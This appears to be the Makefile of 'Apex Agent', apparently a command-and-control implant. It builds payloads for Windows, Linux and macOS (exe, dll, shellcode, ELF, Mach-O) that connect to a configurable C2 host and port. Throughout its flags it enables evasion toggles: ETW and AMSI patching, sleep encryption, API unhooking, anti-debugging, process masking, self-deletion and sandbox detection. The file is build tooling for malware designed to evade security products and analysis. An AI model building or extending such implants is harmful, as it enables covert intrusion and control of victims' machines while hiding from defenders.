# Apex Agent - Multi-platform payload build
# Windows: x86_64-w64-mingw32-gcc (mingw-w64)
# Linux:   gcc (native on teamserver)
# macOS:   o64-clang (osxcross) or clang (native on macOS)

# ── Compilers ──
WIN_CC   = x86_64-w64-mingw32-gcc
LINUX_CC = gcc
MACOS_CC = $(shell command -v o64-clang 2>/dev/null || echo clang)

# ── Build-time config (override via env) ──
C2_HOST  ?= 127.0.0.1
C2_PORT  ?= 8080
USE_HTTPS ?= 0

# ── Common defines ──
COMMON_DEFS = -DC2_HOST=\"$(C2_HOST)\" -DC2_PORT=$(C2_PORT) -DUSE_HTTPS=$(USE_HTTPS)

# ── Windows evasion toggles ──
ENABLE_ETW_PATCH     ?= 1
ENABLE_AMSI_PATCH    ?= 1
ENABLE_SLEEP_ENCRYPT ?= 1
ENABLE_UNHOOK        ?= 1

# ── POSIX (Linux/macOS) evasion toggles ──
ENABLE_ANTI_DEBUG    ?= 1
ENABLE_PROC_MASK     ?= 1
ENABLE_SELF_DELETE   ?= 0
ENABLE_ENV_CLEAN     ?= 1
ENABLE_SANDBOX_CHECK ?= 1

# ── Windows flags ──
WIN_CFLAGS  = -Wall -Wextra -O2 -D_WIN32_WINNT=0x0600 -static-libgcc $(COMMON_DEFS)
WIN_CFLAGS += -DENABLE_ETW_PATCH=$(ENABLE_ETW_PATCH)
WIN_CFLAGS += -DENABLE_AMSI_PATCH=$(ENABLE_AMSI_PATCH)
WIN_CFLAGS += -DENABLE_SLEEP_ENCRYPT=$(ENABLE_SLEEP_ENCRYPT)
WIN_CFLAGS += -DENABLE_UNHOOK=$(ENABLE_UNHOOK)
WIN_LDFLAGS = -lwinhttp -lws2_32 -lbcrypt -static-libgcc

# ── Linux flags ──
LINUX_CFLAGS  = -Wall -Wextra -O2 -s $(COMMON_DEFS)
LINUX_CFLAGS += -DENABLE_ANTI_DEBUG=$(ENABLE_ANTI_DEBUG)
LINUX_CFLAGS += -DENABLE_PROC_MASK=$(ENABLE_PROC_MASK)
LINUX_CFLAGS += -DENABLE_SELF_DELETE=$(ENABLE_SELF_DELETE)
LINUX_CFLAGS += -DENABLE_ENV_CLEAN=$(ENABLE_ENV_CLEAN)
LINUX_CFLAGS += -DENABLE_SANDBOX_CHECK=$(ENABLE_SANDBOX_CHECK)
LINUX_LDFLAGS = -lpthread
ifeq ($(USE_HTTPS),1)
LINUX_LDFLAGS += -lssl -lcrypto
endif

# ── macOS flags ──
MACOS_CFLAGS  = -Wall -Wextra -O2 $(COMMON_DEFS)
MACOS_CFLAGS += -DENABLE_ANTI_DEBUG=$(ENABLE_ANTI_DEBUG)
MACOS_CFLAGS += -DENABLE_PROC_MASK=$(ENABLE_PROC_MASK)
MACOS_CFLAGS += -DENABLE_SELF_DELETE=$(ENABLE_SELF_DELETE)
MACOS_CFLAGS += -DENABLE_ENV_CLEAN=$(ENABLE_ENV_CLEAN)
MACOS_CFLAGS += -DENABLE_SANDBOX_CHECK=$(ENABLE_SANDBOX_CHECK)
MACOS_LDFLAGS = -lpthread
ifeq ($(USE_HTTPS),1)
MACOS_LDFLAGS += -lssl -lcrypto
endif

.PHONY: exe dll shellcode service_exe linux-elf macos-macho all clean

# ── Windows targets ──
exe:
	$(WIN_CC) $(WIN_CFLAGS) -o agent.exe main.c $(WIN_LDFLAGS)

dll:
	$(WIN_CC) $(WIN_CFLAGS) -shared -DBUILD_DLL -o agent.dll main.c $(WIN_LDFLAGS)

shellcode: exe
	cp agent.exe agent.bin

service_exe: exe

# ── Linux target ──
linux-elf:
	$(LINUX_CC) $(LINUX_CFLAGS) -o agent_linux agent_posix.c $(LINUX_LDFLAGS)

# ── macOS target ──
macos-macho:
	$(MACOS_CC) $(MACOS_CFLAGS) -o agent_macos agent_posix.c $(MACOS_LDFLAGS)

all: exe linux-elf

clean:
	rm -f agent.exe agent.dll agent.bin agent_linux agent_macos agent_shellcode.o
